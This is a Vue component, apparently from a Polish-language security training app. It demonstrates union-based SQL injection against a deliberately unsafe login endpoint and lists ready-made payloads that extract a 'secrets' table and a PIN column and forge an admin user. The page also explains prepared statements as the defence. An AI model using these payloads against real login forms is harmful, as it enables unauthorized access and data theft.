<template>
  <div class="items-center justify-evenly full-height full-width q-pa-md" style="display: inline-grid">
    <h1 style="font-size: 30px; line-height: normal">Union-Based SQL Injection</h1>

    <q-card bordered flat>
      <q-card-section>
        <p class="text-bold">
          W tym przykładzie zobaczysz, jak atakujący może uzyskać dane z innych tabel, wykorzystując SQL UNION.
        </p>

        <q-form @submit.prevent="handleLogin">
          <q-input v-model.trim="username" label="Login (payload SQL)" outlined class="q-my-md"
            style="width: 40%; min-width: min(300px, 100%)" />

          <q-input v-model.trim="password" type="password" label="Hasło" outlined class="q-my-md"
            style="width: 40%; min-width: min(300px, 100%)" />

          <q-btn color="primary" type="submit" label="Zaloguj się" />
        </q-form>
      </q-card-section>
    </q-card>

    <q-card bordered flat class="q-mt-md" v-if="loginAttempted">
      <q-card-section>
        <p v-if="loginSuccess" class="text-positive text-bold">
          ✅ Zalogowano pomyślnie!
        </p>
        <p v-else class="text-negative text-bold">
          ❌ Błędny login lub hasło.
        </p>
      </q-card-section>

      <q-card-section v-if="loginSuccess && user">
        <p class="text-bold">Dane użytkownika:</p>
          {{user}}
      </q-card-section>
    </q-card>

    <q-list bordered class="rounded-borders q-mt-lg">
      <q-expansion-item expand-separator icon="question_mark" label="Pokaż podpowiedź">
        <q-card style="max-width: 600px">
          <q-card-section>
          <p>Spróbuj w polu login użyć payloadu:</p>
          <pre><code>' UNION SELECT * FROM secrets where id = 2 --</code></pre>
          <p>To sztucznie generuje użytkownika i wstawia dane bez potrzeby podawania poprawnego hasła.</p>

          <p>Inne przykłady:</p>
          <ul>
            <li><strong>Wszystkie dane z tabeli <code>secrets</code> dla id = 2:</strong>
              <pre><code>' UNION SELECT * FROM secrets where id = 2 --</code></pre>
            </li>
            <li><strong>Wszystkie dane z tabeli <code>secrets</code> dla id = 1:</strong>
              <pre><code>' UNION SELECT * FROM secrets where id = 1 --</code></pre>
            </li>
            <li><strong>Wszystkie dane z tabeli <code>secrets</code> (np. dla użytkownika admina):</strong>
              <pre><code>' UNION SELECT * FROM secrets where userId = 1 --</code></pre>
            </li>
            <li><strong>Wszystkie dane z tabeli <code>secrets</code> dla użytkownika o numerze 2:</strong>
              <pre><code>' UNION SELECT * FROM secrets where userId = 3 --</code></pre>
            </li>
            <li><strong>Inny przykład dla tabeli <code>secrets</code>:</strong>
              <pre><code>' UNION SELECT pin, null, null, null, null  FROM secrets WHERE id = 2 --</code></pre>
            </li>
            <li><strong>Okreslenie liczby kolumn:</strong>
              <pre><code>' UNION SELECT 1,2,3,4,5 --</code></pre>
            </li>
          </ul>
        </q-card-section>
        </q-card>
      </q-expansion-item>

      <q-expansion-item expand-separator icon="warning" label="Dlaczego jest to niebezpieczne?">
        <q-card style="max-width: 600px">
          <q-card-section>
            <p><strong>Union-Based SQL Injection</strong> umożliwia łączenie wyników z różnych zapytań:</p>
            <pre><code>
              SELECT * FROM users WHERE username = ''
              UNION SELECT 1, 'admin', 'admin123', 999, 'admin' --' AND password = '...'
            </code></pre>
            <p>Jeśli aplikacja zwraca dane użytkownika z SELECT-a, wynik z UNION zostanie także wyświetlony. W tym przypadku możemy "wstrzyknąć" własne dane użytkownika, np. z rolą administratora.</p>
            <p><strong>W bezpiecznej wersji</strong> aplikacja:</p>
            <ul>
              <li>Nie pozwala na dołączenie innych SELECT-ów</li>
              <li>Nie zwraca bezpośrednio danych z zapytań</li>
              <li>Stosuje przygotowane zapytania (prepared statements)</li>
            </ul>
          </q-card-section>
        </q-card>
      </q-expansion-item>
    </q-list>
  </div>
</template>

<script setup lang="ts">
import { ref } from 'vue'
import { api } from 'src/boot/axios'
import { useUserStore } from 'src/stores/user'

const username = ref<string>('')
const password = ref<string>('')

const loginAttempted = ref(false)
const loginSuccess = ref(false)

const user = ref(null)  // Nowy rekwizyt do przechowywania danych użytkownika

const handleLogin = async () => {
  loginAttempted.value = true

  try {
    const response = await api.post(
      '/login-unsafe',
      {
        username: username.value,
        password: password.value,
      },
      {
        withCredentials: true,
      }
    )

    loginSuccess.value = response.status === 200
    user.value = response.data.user  // Zapisanie danych użytkownika

    console.log('Login response:', response.data.user)
  } catch (error) {
    console.error(error.response || error)
    loginSuccess.value = false
  }
}
</script>
